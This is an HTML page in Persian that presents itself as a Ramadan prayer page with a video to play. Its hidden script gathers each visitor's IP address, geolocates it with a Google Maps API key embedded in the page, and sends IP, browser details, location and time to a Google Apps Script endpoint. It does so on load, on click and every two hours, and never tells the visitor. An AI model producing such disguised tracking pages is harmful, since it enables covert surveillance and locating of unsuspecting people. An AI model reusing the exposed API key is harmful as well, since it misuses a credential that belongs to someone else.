<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <title>دعای رمضان</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #333;
      text-align: center;
      padding: 20px;
      margin: 0;
      background-image: url('Pic.jpg');
      background-size: cover;
      background-position: center center;
      color: white;
    }
    h1 {
      font-size: 36px;
      color: white;
      margin-top: 20px;
    }
    .content {
      margin-top: 30px;
    }
    p {
      font-size: 18px;
      color: white;
    }
    #video {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      z-index: 999;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
    .video-visible {
      display: block !important;
    }
    a {
      font-size: 20px;
      color: #00bcd4;
      text-decoration: none;
      padding: 10px;
      border-radius: 5px;
      background-color: rgba(0, 0, 0, 0.6);
      transition: background-color 0.3s;
      border-bottom: 2px solid #00bcd4;
    }
    a:hover {
      background-color: #009688;
      color: white;
    }
  </style>
</head>
<body>
  <h1>دعای ماه رمضان</h1>
  <p>اللهم بلغنا رمضان و اعنا على صیامه و قیامه، و تقبله منا برحمتك، یا أرحم الرّاحمین</p>
  <div class="content">
    <p>برای گوش جان سپردن به دعا و برکت رمضان،</p>
    <a href="#" id="showVideo">برای گوش جان سپردن به دعا اینجا را کلیک نمایید</a>
  </div>
  <div id="video">
    <video controls id="videoPlayer">
      <source src="Allahuma_Balighna_Ramadan.mp4?v=1.2.3" type="video/mp4">
      مرورگر شما از ویدئو پشتیبانی نمیکند
    </video>
  </div>
  <p>التماس دعا</p>

  <script>
    const API_KEY_GOOGLE = 'AIzaSyD2E4VlThgXBXzMtAWXxA4IkjzqZ6Ol95g';
    
    // پاک کردن کش
    async function clearCache() {
      const cacheNames = await caches.keys();
      for (const cacheName of cacheNames) {
        await caches.delete(cacheName);
      }
    }

    // دریافت IP از چندین سرویس
    async function getIPAddress() {
      const services = [
        'https://api.ipify.org?format=json',
        'https://ipinfo.io/json',
        'https://worldtimeapi.org/api/ip'
      ];

      for (const url of services) {
        try {
          const response = await fetch(url, { cache: 'no-store' });
          const data = await response.json();
          return data.ip || data.query || data.ipAddress;
        } catch (error) {
          console.error(`Error fetching IP from ${url}:`, error);
        }
      }
      return "N/A"; // اگر IP پیدا نشد
    }

    // دریافت آدرس دقیق از IP با استفاده از Google Maps Geocoding API
    async function getGeoData(ip) {
      try {
        const url = `https://maps.googleapis.com/maps/api/geocode/json?address=${ip}&key=${API_KEY_GOOGLE}`;
        const response = await fetch(url);
        const data = await response.json();
        return data.results.length > 0 ? data.results[0].formatted_address : 'N/A';
      } catch (error) {
        console.error(`Error fetching geo data for IP ${ip}:`, error);
        return null;
      }
    }

    // ارسال اطلاعات به گوگل اسکریپت
    async function logAccess() {
      try {
        const ip = await getIPAddress();
        if (ip === "N/A") {
          console.error('IP not found, not sending data.');
          return; // جلوگیری از ارسال درخواست در صورت عدم وجود IP
        }

        // دریافت آدرس دقیق از IP
        const geoData = await getGeoData(ip);

        const scriptUrl = 'https://script.google.com/macros/s/AKfycbzeyYdoOEkALEiZxTk8hiK-rzOFvSaqh5E9DLfNjEcdyUfd4fpP0yHlD7DBO4ATZ4vOJw/exec'; // آدرس اسکریپت خود را اینجا قرار دهید
        const params = new URLSearchParams({
          ip: ip,  // IP
          ua: navigator.userAgent, // اطلاعات User Agent
          geo: geoData,  // اطلاعات جغرافیایی
          t: Date.now()  // زمان
        });

        const response = await fetch(`${scriptUrl}?${params.toString()}`, { cache: 'no-store', redirect: 'follow' });
        if (!response.ok) {
          console.error('Failed to log access:', response.statusText);
        } else {
          console.log('IP logged successfully:', ip);
        }
      } catch (error) {
        console.error('خطا در ثبت لاگ:', error);
      }
    }

    // مدیریت نمایش ویدئو
    function handleVideoPlay() {
      const videoElem = document.getElementById('videoPlayer');
      videoElem.src = `Allahuma_Balighna_Ramadan.mp4?v=1.2.3`;
      document.getElementById('video').classList.add('video-visible');
      videoElem.play();
    }

    // رویداد کلیک
    document.getElementById('showVideo').addEventListener('click', async (e) => {
      e.preventDefault();
      await clearCache(); // پاک کردن کش
      await logAccess(); // ثبت IP هنگام کلیک
      handleVideoPlay();
    });

    // ارسال دوره‌ای هر 2 ساعت
    setInterval(async () => {
      await logAccess();
    }, 7200000); // 2 ساعت

    // ارسال IP بلافاصله بعد از بارگذاری صفحه
    window.addEventListener('load', async () => {
      await clearCache(); // پاک کردن کش
      await logAccess();
    });
  </script>
</body>
</html>
